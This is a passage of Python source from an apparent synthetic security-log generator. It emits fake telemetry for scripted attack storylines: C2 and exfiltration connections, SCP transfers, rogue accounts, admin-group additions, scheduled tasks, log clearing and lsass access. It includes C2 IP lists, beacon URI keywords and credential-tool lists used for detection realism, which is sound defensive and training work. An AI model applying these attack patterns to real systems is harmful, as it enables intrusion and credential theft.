            if service_context is not None:
                process_actor, process_logon_id, parent_pid = service_context
            else:
                parent_pid = self.activity_generator._resolve_parent(
                    system,
                    process_actor,
                    time,
                    process_logon_id,
                    process_name,
                    process_command_line,
                )
            if os_category == "linux":
                reserved_start_time = (
                    self.activity_generator.reserve_linux_foreground_process_start(
                        system=system,
                        username=process_actor.username,
                        logon_id=process_logon_id,
                        parent_pid=parent_pid,
                        requested_time=time,
                        process_name=process_name,
                        command_line=process_command_line,
                    )
                )
                if isinstance(reserved_start_time, datetime):
                    time = reserved_start_time
                scheduled_bash_time = self.activity_generator.generate_bash_command(
                    process_actor,
                    system,
                    time,
                    command_line,
                    emit_process_telemetry=False,
                )
                if isinstance(scheduled_bash_time, datetime):
                    time = scheduled_bash_time
            exe_name = process_name.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
            service_backed_process = "service_installed" in explicit_types and exe_name in {
                "psexesvc.exe",
                "healthmonitorsvc.exe",
            }
            pid = self.activity_generator.generate_process(
                user=process_actor,
                system=system,
                time=time,
                logon_id=process_logon_id,
                process_name=process_name,
                command_line=process_command_line,
                parent_pid=parent_pid,
                ensure_file_event=not service_backed_process,
                from_storyline=True,
                suppress_command_file_effect=output_file is not None,
            )
            self.activity_generator._record_user_process(system, process_actor, pid, process_name)
            self._record_last_storyline_process(system, pid, process_name)
            malicious_event["process_name"] = process_name
            malicious_event["command_line"] = command_line
            malicious_event["pid"] = pid
            archive_destination = self._extract_compress_archive_destination(command_line)
            if archive_destination:
                staging_source_ip = self._last_storyline_logon_source_for_actor_system(
                    actor,
                    system,
                    at_time=time,
                )
                if staging_source_ip and staging_source_ip != system.ip:
                    self._record_storyline_staged_archive(
                        actor=process_actor,
                        system=system,
                        archive_path=archive_destination,
                        source_ip=staging_source_ip,
                        staged_at=time,
                    )
                    malicious_event["staged_archive"] = archive_destination
            task_name = _extract_schtasks_option(command_line, "tn")
            if task_name and "/create" in command_line.lower():
                self._record_storyline_scheduled_task_command(system, task_name, command_line)
            self._record_storyline_service_create_command(system, command_line)
            self._record_storyline_account_create_command(system, command_line)

            if output_file:
                if os_category == "linux" and output_file.startswith("~/"):
                    home = (
                        "/root"
                        if process_actor.username == "root"
                        else f"/home/{process_actor.username}"
                    )
                    output_file = f"{home}/{output_file[2:]}"
                file_time = time + timedelta(seconds=rng.uniform(0.5, 3.0))
                from evidenceforge.events.base import SecurityEvent
                from evidenceforge.events.contexts import (
                    AuthContext,
                    EdrContext,
                    FileContext,
                    ProcessContext,
                )

                host_ctx = self.activity_generator._build_host_context(system)
                running_proc = self.state_manager.get_process(system.hostname, pid)
                proc_obj_id = self.state_manager.get_process_object_id(system.hostname, pid)
                self.dispatcher.dispatch(
                    SecurityEvent(
                        timestamp=file_time,
                        event_type="file_create",
                        src_host=host_ctx,
                        auth=AuthContext(username=process_actor.username),
                        process=ProcessContext(
                            pid=pid,
                            parent_pid=parent_pid,
                            image=process_name,
                            command_line=process_command_line,
                            username=process_actor.username,
                            logon_id=process_logon_id,
                            start_time=running_proc.start_time
                            if running_proc is not None
                            else None,
                        ),
                        file=FileContext(path=output_file, action="create", pid=pid),
                        edr=EdrContext(
                            object_id=stable_uuid(
                                "storyline-output-file-edr",
                                system.hostname,
                                pid,
                                output_file,
                                file_time.isoformat(),
                            ),
                            actor_id=proc_obj_id,
                        ),
                        storyline_origin=True,
                    )
                )
                malicious_event["output_file"] = output_file

            http_url = self._extract_http_url(command_line)
            if http_url is not None:
                parsed_target = self._parse_http_url_target(http_url)
                if parsed_target is not None:
                    from urllib.parse import urlparse

                    from evidenceforge.events.contexts import HttpContext

                    hostname, dst_port = parsed_target
                    parsed_url = urlparse(http_url)
                    uri = parsed_url.path or "/"
                    if parsed_url.query:
                        uri = f"{uri}?{parsed_url.query}"
                    mime_type = normalize_mime_type_for_path(uri, "text/plain")
                    response_body_len = (
                        apply_transfer_size_variance(
                            response_size_for_status(200, hostname, uri),
                            status_code=200,
                            host=hostname,
                            uri=uri,
                            content_type=mime_type,
                            variant_key=f"{system.ip}:{process_name}:{pid}",
                        )
                        if is_stable_resource_path(uri)
                        else response_size_for_mime(rng, mime_type)
                    )
                    preserve_url_dst_ip = False
                    dst_ip = self._resolve_storyline_network_target(hostname)
                    if dst_ip is None:
                        authored_dst_ip = self._storyline_authored_ip_for_hostname(hostname)
                        if authored_dst_ip is not None:
                            dst_ip = authored_dst_ip
                            preserve_url_dst_ip = True
                    if dst_ip is None:
                        from evidenceforge.generation.activity.dns_registry import resolve_domain_ip

                        dst_ip = resolve_domain_ip(hostname, src_host=system.hostname)
                    service = "ssl" if dst_port == 443 else "http"
                    network_time = self._clamp_after_storyline_process_source_create(
                        system=system,
                        pid=pid,
                        network_time=time + timedelta(milliseconds=rng.randint(250, 900)),
                        rng=rng,
                    )
                    self.activity_generator.generate_connection(
                        src_ip=system.ip,
                        dst_ip=dst_ip,
                        time=network_time,
                        dst_port=dst_port,
                        proto="tcp",
                        service=service,
                        duration=rng.uniform(0.8, 6.0),
                        orig_bytes=rng.randint(300, 1400),
                        resp_bytes=response_body_len,
                        conn_state="SF",
                        emit_dns=not _is_private_ip(dst_ip),
                        source_system=system,
                        pid=pid,
                        hostname=hostname,
                        process_image=process_name,
                        preserve_dst_ip=preserve_url_dst_ip,
                        http=HttpContext(
                            method="GET",
                            host=hostname,
                            uri=uri,
                            version="1.1",
                            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/5.1",
                            request_body_len=0,
                            response_body_len=response_body_len,
                            status_code=200,
                            status_msg="OK",
                            resp_mime_types=[mime_type],
                            tags=[],
                        ),
                    )
                    malicious_event["network_url"] = http_url

            remote_db_target = self._extract_database_client_target(command_line, os_category)
            if remote_db_target is not None:
                target_host, dst_port, service = remote_db_target
                target_ip = self._resolve_storyline_network_target(target_host)
                target_hostname = None if _IPV4_LITERAL_RE.fullmatch(target_host) else target_host
                unresolved_single_label_fallback = False
                if target_ip is None and target_hostname is not None:
                    ad_domain = getattr(self, "_ad_domain", "")
                    target_lower = target_hostname.rstrip(".").lower()
                    unresolved_single_label = "." not in target_lower
                    looks_internal = target_lower.endswith(".local") or (
                        bool(ad_domain) and target_lower.endswith(f".{ad_domain.lower()}")
                    )
                    if unresolved_single_label:
                        if self._is_local_database_instance_target(target_hostname):
                            target_hostname = None
                        else:
                            target_ip = self._unresolved_database_target_ip(target_hostname)
                            unresolved_single_label_fallback = target_ip is not None
                            if ad_domain:
                                target_hostname = f"{target_hostname}.{ad_domain}"
                    elif not looks_internal:
                        from evidenceforge.generation.activity.dns_registry import (
                            resolve_domain_ip,
                        )

                        target_ip = resolve_domain_ip(target_hostname, src_host=system.hostname)
                if target_ip is not None:
                    target_system = self._system_for_ip(target_ip)
                    failed_private_attempt = unresolved_single_label_fallback or (
                        target_system is None and _is_private_ip(target_ip)
                    )
                    firewall_ctx = None
                    conn_state = "SF"
                    duration = rng.uniform(0.6, 8.0)
                    orig_bytes = rng.randint(180, 900)
                    resp_bytes = rng.randint(800, 6000)
                    rendered_service = service
                    if failed_private_attempt:
                        from evidenceforge.events.contexts import FirewallContext

                        src_iface = self._resolve_firewall_interface(system.ip)
                        dst_iface = self._resolve_firewall_interface(target_ip)
                        firewall_ctx = FirewallContext(
                            action="deny",
                            msg_id=106023,
                            connection_id=0,
                            src_interface=src_iface,
                            dst_interface=dst_iface,
                            access_group=f"{src_iface}_access_in",
                        )
                        conn_state = self._get_firewall_deny_conn_state()
                        duration = rng.uniform(0.02, 0.45)
                        orig_bytes = 0
                        resp_bytes = 0
                        rendered_service = None
                    connection_time = self._clamp_after_storyline_process_source_create(
                        system=system,
                        pid=pid,
                        network_time=time + timedelta(milliseconds=rng.randint(250, 900)),
                        rng=rng,
                    )
                    self.activity_generator.generate_connection(
                        src_ip=system.ip,
                        dst_ip=target_ip,
                        time=connection_time,
                        dst_port=dst_port,
                        proto="tcp",
                        service=rendered_service,
                        duration=duration,
                        orig_bytes=orig_bytes,
                        resp_bytes=resp_bytes,
                        conn_state=conn_state,
                        emit_dns=target_hostname is not None,
                        source_system=system,
                        pid=pid,
                        hostname=target_hostname,
                        process_image=process_name,
                        firewall=firewall_ctx,
                    )
                    malicious_event["network_target"] = target_host
                    malicious_event["network_target_ip"] = target_ip
                    malicious_event["network_target_port"] = dst_port

            scp_destination = self._extract_scp_destination(command_line, os_category)
            scp_target = scp_destination[0] if scp_destination is not None else None
            if scp_target is not None:
                dst_ip = self._resolve_storyline_network_target(scp_target)
                if dst_ip:
                    transfer_time = self._clamp_after_storyline_process_source_create(
                        system=system,
                        pid=pid,
                        network_time=time + timedelta(milliseconds=rng.randint(250, 900)),
                        rng=rng,
                    )
                    source_port = self.activity_generator.reserve_ssh_source_port(
                        system.ip,
                        dst_ip,
                        None,
                        rng,
                        _get_os_category(system.os),
                        time=transfer_time,
                    )
                    transfer_duration = rng.uniform(2.0, 30.0)
                    orig_bytes = rng.randint(20_000, 250_000)
                    resp_bytes = rng.randint(4_000, 40_000)
                    target_system = self._system_for_ip(dst_ip)
                    if (
                        target_system is not None
                        and _get_os_category(target_system.os) == "linux"
                        and scp_destination is not None
                    ):
                        target_user = self._resolve_scp_target_user(
                            extracted_username=scp_destination[2],
                            fallback_username=process_actor.username,
                        )
                        self.activity_generator.generate_ssh_session(
                            user=self.activity_generator._user_model_for_username(target_user),
                            target_system=target_system,
                            time=transfer_time,
                            source_ip=system.ip,
                            source_system=system,
                            source_port=source_port,
                            source_pid=pid,
                            source_process_image=process_name,
                            duration=transfer_duration,
                            orig_bytes=orig_bytes,
                            resp_bytes=resp_bytes,
                            auth_method="publickey",
                            source="storyline_scp",
                        )
                        self._emit_scp_receiver_artifacts(
                            source_system=system,
                            target_system=target_system,
                            actor=process_actor,
                            source_pid=pid,
                            source_process=process_name,
                            source_command=command_line,
                            target_user=target_user,
                            target_path=scp_destination[1],
                            transfer_time=transfer_time,
                            source_port=source_port,
                            rng=rng,
                        )
                    else:
                        self.activity_generator.generate_connection(
                            src_ip=system.ip,
                            dst_ip=dst_ip,
                            time=transfer_time,
                            dst_port=22,
                            proto="tcp",
                            service="ssh",
                            duration=transfer_duration,
                            orig_bytes=orig_bytes,
                            resp_bytes=resp_bytes,
                            conn_state="SF",
                            emit_dns=not _is_private_ip(dst_ip),
                            source_system=system,
                            pid=pid,
                            process_image=process_name,
                            src_port=source_port,
                        )

            _EXPLICIT_CRED_TOOLS = {"psexec", "wmic", "runas", "schtasks"}
            proc_basename = (
                process_name.rsplit("\\", 1)[-1].lower()
                if "\\" in process_name
                else process_name.lower()
            )
            command_lower = command_line.lower()
            uses_explicit_creds = proc_basename in _EXPLICIT_CRED_TOOLS or (
                proc_basename in {"net.exe", "net1.exe"}
                and any(token in command_lower for token in ("/user:", " /u:", " /user "))
            )
            if uses_explicit_creds and os_category == "windows":
                cred_time = time - timedelta(milliseconds=rng.randint(5, 50))
                self.activity_generator.generate_explicit_credentials(
                    user=process_actor,
                    system=system,
                    time=cred_time,
                    target_username=process_actor.username,
                    target_server="localhost",
                    process_name=process_name,
                    process_pid=pid,
                )

            if os_category == "windows" and getattr(spec, "supplementary", "auto") != "none":
                self.activity_generator._expand_and_emit(
                    "process_create",
                    time,
                    actor=process_actor,
                    target_system=system,
                    command_line=command_line,
                    os_category=os_category,
                    source_pid=pid,
                    logon_id=process_logon_id,
                    skip_types=explicit_types,
                )

            # Mark as story process and schedule termination
            self.state_manager.mark_story_process(system.hostname, pid)
            lifetime = _estimate_process_lifetime(process_name, process_command_line)
            if lifetime is not None:
                term_delay = rng.uniform(lifetime[0], lifetime[1])
                term_time = time + timedelta(seconds=term_delay)
                shell_release_time = term_time
                terminate_immediately = False
                if os_category == "linux":
                    from evidenceforge.generation.activity.generator import (
                        _linux_foreground_lifetime,
                    )

                    terminate_immediately = (
                        _linux_foreground_lifetime(process_name, process_command_line) is not None
                    )
                    if terminate_immediately and self._process_has_following_same_host_connection(
                        system,
                        future_specs,
                    ):
                        terminate_immediately = False
                if terminate_immediately:
                    self.activity_generator.generate_process_termination(
                        user=process_actor,
                        system=system,
                        time=term_time,
                        pid=pid,
                        process_name=process_name,
                        logon_id=process_logon_id,
                        from_storyline=True,
                    )
                    source_term_getter = getattr(
                        self.activity_generator,
                        "process_source_terminate_time",
                        None,
                    )
                    if callable(source_term_getter):
                        source_term_time = source_term_getter(system.hostname, pid)
                        if isinstance(source_term_time, datetime):
                            shell_release_time = max(shell_release_time, source_term_time)
                else:
                    self._queue_story_process_termination(
                        actor=process_actor,
                        system=system,
                        time=term_time,
                        pid=pid,
                        process_name=process_name,
                        logon_id=process_logon_id,
                    )
                if os_category == "linux":
                    self.activity_generator.remember_linux_foreground_process_completion(
                        system=system,
                        username=process_actor.username,
                        logon_id=process_logon_id,
                        parent_pid=parent_pid,
                        termination_time=shell_release_time,
                        process_name=process_name,
                        command_line=process_command_line,
                    )
                    self._storyline_shell_available_at[shell_key] = shell_release_time
                    process_shell_key = (system.hostname, process_actor.username)
                    self._storyline_shell_available_at[process_shell_key] = shell_release_time

        elif spec.type == "connection":
            _c2_ips = ["159.65.43.201", "134.209.29.115", "167.71.156.88"]
            source_ip = spec.source_ip or system.ip
            dst_ip = spec.dst_ip
            effective_dst_ip = dst_ip
            if (
                not _is_private_ip(source_ip)
                and hasattr(self, "dispatcher")
                and self.dispatcher.visibility_engine
            ):
                effective_dst_ip = self.dispatcher.visibility_engine._real_ip_to_vip.get(
                    dst_ip, dst_ip
                )
            dst_port = spec.dst_port
            service = spec.service or (
                "ssl" if dst_port == 443 else "http" if dst_port == 80 else "ssl"
            )
            s_ob, s_rb = _size_storyline_connection(spec, rng)
            # Build HttpContext if HTTP fields are provided
            http_ctx = None
            if spec.method or spec.uri:
                from evidenceforge.events.contexts import HttpContext

                # Context-aware response sizing (or author-specified override)
                _method = spec.method or "GET"
                _uri_raw = spec.uri or "/"
                _uri = _uri_raw.lower()
                _mime_type = normalize_mime_type_for_path(_uri_raw, "text/html")
                _is_c2_http = _is_c2_http_request(
                    description=spec.description,
                    technique=spec.technique,
                    uri=_uri_raw,
                    activity=activity,
                )
                if _is_c2_http and _mime_type == "text/html":
                    _mime_type = rng.choices(
                        ["application/json", "text/plain", "application/octet-stream"],
                        weights=[55, 25, 20],
                        k=1,
                    )[0]
                if spec.response_body_len is not None:
                    resp_bytes = spec.response_body_len
                elif _method == "POST" and any(
                    kw in _uri for kw in ("/upload", "/submit", "/api", "/beacon")
                ):
                    resp_bytes = rng.randint(200, 2000)
                elif _method == "GET" and any(
                    kw in _uri for kw in ("/callback", "/task", "/cmd", "/beacon", "/gate")
                ):
                    resp_bytes = rng.randint(500, 5000)
                elif _is_c2_http:
                    resp_bytes = _c2_http_response_size(rng, method=_method, uri=_uri_raw)
                elif _method == "POST":
                    resp_bytes = rng.randint(200, 5000)
                else:
                    resp_bytes = response_size_for_mime(rng, _mime_type)
                from evidenceforge.generation.activity.referrer import pick_referrer

                _http_host = spec.hostname or dst_ip
                request_body_len = (
                    max(0, s_ob or 0) if _method not in {"GET", "HEAD", "CONNECT", "OPTIONS"} else 0
                )
                if request_body_len == 0 and _method == "POST":
                    request_body_len = rng.randint(100, 10000)
                http_ctx = HttpContext(
                    method=_method,
                    host=_http_host,
                    uri=_uri_raw,
                    version="1.1",
                    user_agent=spec.user_agent or "Mozilla/5.0",
                    request_body_len=request_body_len,
                    response_body_len=resp_bytes,
                    status_code=spec.status_code or 200,
                    status_msg={
                        200: "OK",
                        301: "Moved Permanently",
                        302: "Found",
                        403: "Forbidden",
                        404: "Not Found",
                        500: "Internal Server Error",
                    }.get(spec.status_code or 200, "OK"),
                    referrer=spec.referrer
                    if spec.referrer is not None
                    else ""
                    if _is_c2_http and rng.random() < 0.8
                    else pick_referrer(rng, _http_host, context="general"),
                    resp_mime_types=[_mime_type] if (spec.status_code or 200) == 200 else [],
                    tags=[],
                )

            # Resolve source system from source_ip (not storyline system, which may be the target)
            src_sys = None
            ip_map = getattr(self.activity_generator, "_ip_to_system", {})
            if source_ip in ip_map:
                src_sys = ip_map[source_ip]
            elif source_ip == system.ip:
                src_sys = system
            story_pid, story_image = self._last_storyline_process_for_system(src_sys)
            if story_pid > 0 and src_sys is not None and service in {"ssl", "https"}:
                story_proc = self.state_manager.get_process(src_sys.hostname, story_pid)
                story_command = story_proc.command_line if story_proc is not None else ""
                if self._command_contains_raw_tcp_endpoint(story_command, dst_ip, dst_port):
                    service = ""
            # Only use explicit hostname from scenario.  Do NOT fall back to
            # Hostname resolution for storyline connections:
            # - Explicit hostname → use it, emit DNS
            # - No hostname but IP in REVERSE_DNS → use known hostname, emit DNS
            # - No hostname, unknown IP → suppress (raw-IP C2/exfil), no DNS
            from evidenceforge.generation.activity.network import REVERSE_DNS

            if spec.hostname:
                conn_hostname = spec.hostname
                emit_dns = True
            elif dst_ip in REVERSE_DNS:
                conn_hostname = None  # let generate_connection resolve via REVERSE_DNS
                emit_dns = True
            else:
                conn_hostname = ""  # suppress — raw IP
                emit_dns = False
            s_conn_state = spec.conn_state or "SF"
            if _is_exfil_connection_spec(spec):
                self._emit_storyline_archive_transfer_before_exfil(
                    source_ip=source_ip,
                    exfil_time=time,
                    upload_bytes=s_ob,
                    rng=rng,
                )
            connection_time = self._clamp_after_storyline_process_source_create(
                system=src_sys,
                pid=story_pid,
                network_time=time,
                rng=rng,
            )
            uid = self.activity_generator.generate_connection(
                src_ip=source_ip,
                dst_ip=effective_dst_ip,
                time=connection_time,
                dst_port=dst_port,
                service=service,
                duration=rng.uniform(1.0, 30.0),
                orig_bytes=s_ob,
                resp_bytes=s_rb,
                conn_state=s_conn_state,
                emit_dns=emit_dns,
                source_system=src_sys,
                http=http_ctx,
                pid=story_pid,
                process_image=story_image,
                hostname=conn_hostname,
                preserve_dst_ip=bool(spec.hostname),
            )
            logged_dst_ip = getattr(
                self.activity_generator,
                "_last_connection_effective_dst_ip",
                effective_dst_ip,
            )
            malicious_event["dst_ip"] = logged_dst_ip
            malicious_event["dst_port"] = dst_port
            malicious_event["uid"] = _ground_truth_uid(uid, source_ip, logged_dst_ip)

            # Causal expansion: SMB to file server emits type 3 logon pair
            if dst_port == 445:
                dst_sys = next(
                    (s for s in self.scenario.environment.systems if s.ip == dst_ip),
                    None,
                )
                if (
                    dst_sys
                    and dst_sys.roles
                    and "file_server" in [r.lower() for r in dst_sys.roles]
                ):
                    if hasattr(self, "_emit_smb_logon_pair"):
                        smb_source_port = None
                        matcher = getattr(
                            self.activity_generator,
                            "_last_effective_connection_source_port",
                            None,
                        )
                        if matcher is not None:
                            smb_source_port = matcher(
                                src_ip=source_ip,
                                dst_ip=logged_dst_ip,
                                dst_port=445,
                                proto="tcp",
                            )
                        self._emit_smb_logon_pair(
                            actor,
                            dst_sys,
                            source_ip,
                            time,
                            rng,
                            source_port=smb_source_port,
                            emit_network_evidence=smb_source_port is None,
                        )

        elif spec.type == "ssh_session":
            target = next(
                (s for s in self.scenario.environment.systems if s.ip == system.ip), system
            )
            if hasattr(self, "world_planner"):
                source_system = (
                    self.world_model.system_for_ip(spec.source_ip)
                    if spec.source_ip and hasattr(self, "world_model")
                    else None
                )
                result = self.world_planner.bootstrap_user_session(
                    user=actor,
                    target_system=target,
                    time=time,
                    rng=rng,
                    session_kind="ssh",
                    source_system=source_system,
                    allow_existing=False,
                    source_ip_override=spec.source_ip,
                    storyline_protected=True,
                )
            else:
                source_ip = spec.source_ip or system.ip
                uid = self.activity_generator.generate_ssh_session(
                    user=actor,
                    target_system=target,
                    time=time,
                    source_ip=source_ip,
                )
                result = SimpleNamespace(network_uid=uid)
            if getattr(result, "session", None) is not None:
                self._record_storyline_logon(
                    actor,
                    target,
                    result.session.logon_id,
                    source_ip=result.session.source_ip,
                )
            malicious_event["dst_ip"] = system.ip
            malicious_event["dst_port"] = 22
            result_source_ip = (
                result.session.source_ip
                if getattr(result, "session", None) is not None
                else spec.source_ip or system.ip
            )
            malicious_event["uid"] = _ground_truth_uid(
                result.network_uid or "",
                result_source_ip,
                target.ip,
            )

        elif spec.type == "rdp_session":
            target = next(
                (s for s in self.scenario.environment.systems if s.ip == system.ip), system
            )
            if hasattr(self, "world_planner"):
                source_system = (
                    self.world_model.system_for_ip(spec.source_ip)
                    if spec.source_ip and hasattr(self, "world_model")
                    else None
                )
                result = self.world_planner.bootstrap_user_session(
                    user=actor,
                    target_system=target,
                    time=time,
                    rng=rng,
                    session_kind="rdp",
                    source_system=source_system,
                    allow_existing=False,
                    source_ip_override=spec.source_ip,
                    storyline_protected=True,
                )
            else:
                source_ip = spec.source_ip or system.ip
                uid = self.activity_generator.generate_rdp_session(
                    user=actor,
                    target_system=target,
                    time=time,
                    source_ip=source_ip,
                )
                result = SimpleNamespace(network_uid=uid)
            if getattr(result, "session", None) is not None:
                malicious_event["actor"] = result.session.username
            malicious_event["dst_ip"] = system.ip
            malicious_event["dst_port"] = 3389
            result_source_ip = (
                result.session.source_ip
                if getattr(result, "session", None) is not None
                else spec.source_ip or system.ip
            )
            malicious_event["uid"] = _ground_truth_uid(
                result.network_uid or "",
                result_source_ip,
                target.ip,
            )

        elif spec.type == "account_created":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            target_sid = spec.target_sid or self._make_domain_sid()
            effect_time = self._clamp_after_recent_storyline_process_source_create(
                system=system,
                event_time=time,
                rng=rng,
            )
            self.activity_generator.generate_account_created(
                actor=actor,
                system=dc,
                time=effect_time,
                target_username=spec.target_username,
                target_sid=target_sid,
            )
            # Store SID for later reuse by group_member_added, account_deleted,
            # and any _get_sid() lookups (Windows event rendering).
            self._created_account_sids[spec.target_username] = target_sid
            self.activity_generator.sid_registry[spec.target_username] = target_sid
            self._created_account_effect_times[
                self._account_create_lookup_key(dc, spec.target_username)
            ] = effect_time
            self._record_storyline_host_available_after(
                system=dc,
                actor=actor,
                time=effect_time,
                rng=rng,
            )
            if self._recent_storyline_account_create_command(dc, spec.target_username):
                self._emit_storyline_account_password_followups(
                    actor=actor,
                    system=dc,
                    time=effect_time,
                    target_username=spec.target_username,
                    target_sid=target_sid,
                )
            malicious_event["target_username"] = spec.target_username

        elif spec.type == "account_deleted":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            target_sid = (
                spec.target_sid
                or self._created_account_sids.get(spec.target_username)
                or self._make_domain_sid()
            )
            effect_time = self._clamp_after_recent_storyline_process_source_create(
                system=system,
                event_time=time,
                rng=rng,
            )
            self.activity_generator.generate_account_deleted(
                actor=actor,
                system=dc,
                time=effect_time,
                target_username=spec.target_username,
                target_sid=target_sid,
                from_storyline=True,
            )
            malicious_event["target_username"] = spec.target_username

        elif spec.type == "group_member_added":
            dc = next(
                (s for s in self.scenario.environment.systems if s.type == "domain_controller"),
                system,
            )
            group_rid = 512 if "admin" in spec.group_name.lower() else rng.randint(1100, 9999)
            group_sid = self._make_domain_sid(group_rid)
            # Reuse SID from earlier account_created event, or generate new
            member_sid = (
                self._created_account_sids.get(spec.member_name)
                or self.activity_generator.sid_registry.get(spec.member_name)
                or self._make_domain_sid()
            )
            effect_time = self._clamp_after_recent_storyline_process_source_create(
                system=dc,
                event_time=time,
                rng=rng,
            )
            account_created_at = self._created_account_effect_times.get(
                self._account_create_lookup_key(dc, spec.member_name)
            )
            if account_created_at is not None and effect_time <= account_created_at:
                effect_time = account_created_at + timedelta(milliseconds=rng.randint(180, 950))
            self.activity_generator.generate_group_membership_change(
                actor=actor,
                system=dc,
                time=effect_time,
                action="add",
                scope=spec.scope,
                group_name=spec.group_name,
                group_sid=group_sid,
                member_username=spec.member_name,
                member_sid=member_sid,
            )
            self._record_storyline_host_available_after(
                system=dc,
                actor=actor,
                time=effect_time,
                rng=rng,
            )
            malicious_event["group_name"] = spec.group_name
            malicious_event["member_name"] = spec.member_name

        elif spec.type == "service_installed":
            effect_time = self._clamp_after_recent_storyline_process_source_create(
                system=system,
                event_time=time,
                rng=rng,
            )
            self.activity_generator.generate_service_installed(
                user=actor,
                system=system,
                time=effect_time,
                service_name=spec.service_name,
                service_file_name=spec.service_file_name,
                service_start_type=self._recent_storyline_service_start_type(
                    system,
                    spec.service_name,
                ),
                service_account=spec.service_account,
            )
            self._record_storyline_service_install(
                system=system,
                service_name=spec.service_name,
                service_file_name=spec.service_file_name,
                service_account=spec.service_account,
                time=effect_time,
            )
            malicious_event["service_name"] = spec.service_name
            if spec.service_file_name:
                malicious_event["service_file_name"] = spec.service_file_name

        elif spec.type == "scheduled_task_created":
            task_content = spec.task_content
            source_command_line = self._recent_storyline_scheduled_task_command(
                system,
                spec.task_name,
            )
            if not task_content:
                task_content = (
                    f'<?xml version="1.0" encoding="UTF-16"?>\n'
                    f'<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n'
                    f'  <Actions Context="Author">\n'
                    f"    <Exec>\n"
                    f"      <Command>C:\\Windows\\System32\\cmd.exe</Command>\n"
                    f'      <Arguments>/c "{spec.task_name}"</Arguments>\n'
                    f"    </Exec>\n"
                    f"  </Actions>\n"
                    f"</Task>"
                )
            elif not task_content.lstrip().startswith(("<?xml", "<Task")):
                task_content = (
                    f'<?xml version="1.0" encoding="UTF-16"?>\n'
                    f'<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n'
                    f'  <Actions Context="Author">\n'
                    f"    <Exec>\n"
                    f"      <Command>{task_content}</Command>\n"
                    f"    </Exec>\n"
                    f"  </Actions>\n"
                    f"</Task>"
                )
            effect_time = self._clamp_after_recent_storyline_process_source_create(
                system=system,
                event_time=time,
                rng=rng,
            )
            self.activity_generator.generate_scheduled_task(
                user=actor,
                system=system,
                time=effect_time,
                task_name=spec.task_name,
                action="created",
                task_content=task_content,
                source_command_line=source_command_line,
            )
            malicious_event["task_name"] = spec.task_name
            malicious_event["task_content"] = task_content

        elif spec.type == "log_cleared":
            effect_time = self._clamp_after_recent_storyline_process_source_create(
                system=system,
                event_time=time,
                rng=rng,
            )
            subject_logon_id = self._recent_storyline_process_logon_id(
                actor,
                system,
                effect_time,
                executable="wevtutil.exe",
            )
            self.activity_generator.generate_log_cleared(
                user=actor,
                system=system,
                time=effect_time,
                from_storyline=True,
                subject_logon_id=subject_logon_id,
            )

        elif spec.type == "create_remote_thread":
            source_pid, source_image = self._last_storyline_process_for_system(system)
            # Use a realistic target PID — look up the process name from
            # system PIDs or use a plausible default (not 4 = System kernel)
            target_image = _normalize_storyline_process_image(
                spec.target_process,
                _get_os_category(system.os),
                username=actor.username,
            )
            target_name = target_image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
            if source_pid <= 0:
                # Without a live source process, there is no realistic Sysmon
                # Event 8 relationship to render. Keep the storyline record,
                # but mark it skipped instead of claiming generated evidence.
                malicious_event["target_process"] = target_image
                malicious_event["skipped_reason"] = "no_live_source_process"
            else:
                effect_time = self._clamp_after_storyline_process_source_create(
                    system=system,
                    pid=source_pid,
                    network_time=time,
                    rng=rng,
                )
                target_pid = self.activity_generator._get_system_pid(
                    system.hostname,
                    target_name.replace(".exe", ""),
                    0x27C,  # 636 default
                )
                evidence_emitted = self.activity_generator.generate_create_remote_thread(
                    user=actor,
                    system=system,
                    time=effect_time,
                    source_pid=source_pid,
                    source_image=source_image,
                    target_pid=target_pid,
                    target_image=target_image,
                )
                malicious_event["target_process"] = target_image
                if not evidence_emitted:
                    malicious_event["skipped_reason"] = "no_live_target_process"
                # Emit ProcessAccess via causal expansion engine (or legacy fallback)
                # when targeting lsass.exe — primary credential-dumping detection signal
                elif "lsass" in target_name:
                    self.activity_generator._expand_and_emit(
                        "create_remote_thread",
                        effect_time,
                        actor=actor,
                        target_system=system,
                        source_pid=source_pid,
                        source_image=source_image,
                        target_pid=target_pid,
                        target_image=target_image,
                    )

        elif spec.type == "process_access":
            source_pid, source_image = self._last_storyline_process_for_system(system)
            os_category = _get_os_category(system.os)
            target_image = _normalize_storyline_process_image(
                spec.target_process,
                os_category,
                username=actor.username,
            )
            if source_pid <= 0:
                # Without a live source process, there is no realistic Sysmon
                # Event 10 relationship to render. Keep the storyline record,
                # but mark it skipped instead of claiming generated evidence.
                malicious_event["target_process"] = target_image
                malicious_event["skipped_reason"] = "no_live_source_process"
            else:
                target_name = target_image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower()
                target_pid = self.activity_generator._get_system_pid(
                    system.hostname,
                    target_name.replace(".exe", ""),
                    0x27C,
                )
                evidence_emitted = self.activity_generator.generate_process_access(
                    user=actor,
                    system=system,
                    time=self._clamp_after_storyline_process_source_create(
                        system=system,
                        pid=source_pid,
                        network_time=time,
                        rng=rng,
                    ),
                    source_pid=source_pid,
                    source_image=source_image,
                    target_pid=target_pid,
                    target_image=target_image,
                    granted_access=spec.access_mask,
                )
                malicious_event["target_process"] = target_image
                if not evidence_emitted:
                    malicious_event["skipped_reason"] = "no_live_target_process"

        elif spec.type == "dhcp_lease":
            existing_lease = getattr(self, "_dhcp_lease_state", {}).get(system.hostname)
            if spec.mac_address:
                mac = spec.mac_address
            elif existing_lease:
                mac = existing_lease["mac"]
            else:
                ip_hash = _stable_seed(f"mac_{spec.requested_ip or system.ip}")
                mac = (
                    f"00:50:56:{(ip_hash >> 16) & 0xFF:02x}"
                    f":{(ip_hash >> 8) & 0xFF:02x}:{ip_hash & 0xFF:02x}"
                )
            from evidenceforge.utils.ids import generate_zeek_uid

            # Use DC as DHCP server (common in AD environments)
            dc_ips = self._infra_ips.get("dc", ["10.0.0.1"]) if hasattr(self, "_infra_ips") else []
            dhcp_server = dc_ips[0] if dc_ips else "10.0.0.1"
            lease_time = (
                float(existing_lease["lease_time"])
                if existing_lease
